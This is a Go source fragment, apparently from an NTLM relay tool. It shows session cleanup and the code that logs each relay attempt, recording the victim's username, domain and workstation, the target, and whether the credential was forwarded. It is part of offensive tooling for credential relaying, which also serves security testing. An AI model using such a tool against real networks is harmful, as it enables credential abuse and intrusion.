// the authenticate path can both reach it.
func (s *relaySession) close() {
	s.once.Do(func() {
		if s.timer != nil {
			s.timer.Stop()
		}
		if s.client != nil {
			s.client.Kill()
		}
	})
}

// record writes one _type: "relay" record describing what happened to a
// victim's credential.
func (c *RelayConfig) record(x *NTLMExchange, t *RelayTarget, auth *NTLMAuth, outcome, reason string) {
	c.recordFields(x, t, auth, outcome, reason, nil)
}

// recordFields is record with extra fields merged in.
func (c *RelayConfig) recordFields(x *NTLMExchange, t *RelayTarget, auth *NTLMAuth, outcome, reason string, extra map[string]string) {
	c.recordType(x, "relay", t, auth, outcome, reason, extra)
}

// recordType writes a relay record of the given type.
//
// Every record names the target and the outcome, and says plainly whether the
// victim's credential reached the target: relayed is true only for the
// outcomes that mean the AUTHENTICATE was forwarded, so "relayed and worked",
// "relayed and was rejected" and "never relayed" are distinguishable without
// reading the reason.
func (c *RelayConfig) recordType(x *NTLMExchange, rtype string, t *RelayTarget, auth *NTLMAuth, outcome, reason string, extra map[string]string) {
	if c == nil || c.RecordWriter == nil {
		return
	}
	fields := map[string]string{
		"_server": x.ServerAddr,
		"outcome": outcome,
		"relayed": strconv.FormatBool(relayReached(outcome)),
	}
	if t != nil {
		fields["target"] = t.String()
		fields["target_scheme"] = t.Scheme
		fields["target_host"] = t.Host
		fields["target_port"] = strconv.Itoa(t.Port)
	}
	if auth != nil {
		fields["username"] = auth.User
		fields["domain"] = auth.Domain
		fields["workstation"] = auth.Workstation
	}
	if reason != "" {
		fields["error"] = reason
	}
	for k, v := range extra {
		fields[k] = v
	}
	c.RecordWriter.Record(rtype, x.Proto, x.RemoteAddr, fields)
}

// relayReached reports whether an outcome means the victim's AUTHENTICATE was
// actually forwarded to the target.
func relayReached(outcome string) bool {
	switch outcome {
	case relayOutcomeSuccess, relayOutcomeRejected, relayOutcomeSigning:
		return true
	}
	return false
}
